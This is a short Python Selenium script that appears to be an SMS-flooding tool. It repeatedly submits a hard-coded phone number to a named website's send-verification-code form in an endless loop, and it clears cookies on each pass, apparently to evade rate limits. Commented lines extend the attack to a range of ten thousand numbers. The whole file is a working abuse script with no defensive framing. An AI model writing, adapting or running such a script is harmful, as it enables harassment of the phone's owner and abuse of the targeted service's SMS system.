from selenium import webdriver
from selenium.webdriver import ActionChains
import time

url = "https://sharifict.ir/SendCode"


def chromewebdriver():
    return webdriver.Chrome("C:\\Users\\raminfp\\Desktop\\Day_1\\chromedriver_win32\\chromedriver.exe")

# 09191580000
# 09191589999



def mysite(phone):
    driver = chromewebdriver()
    driver.get(url)

    phone_number = driver.find_element_by_css_selector("#MobileNumber")
    phone_number.send_keys(phone)
    time.sleep(1)
    btn = driver.find_element_by_css_selector("#root > div > div > div.jss1 > div > div > div > form > div.jss127.jss8 > button")
    btn.click()
    time.sleep(5)
    driver.delete_all_cookies()
    driver.close()
#
# for i in range(9191580000, 9191589999):


while True:
    phone = "09191583239" #"0" + str(i)
    mysite(phone)

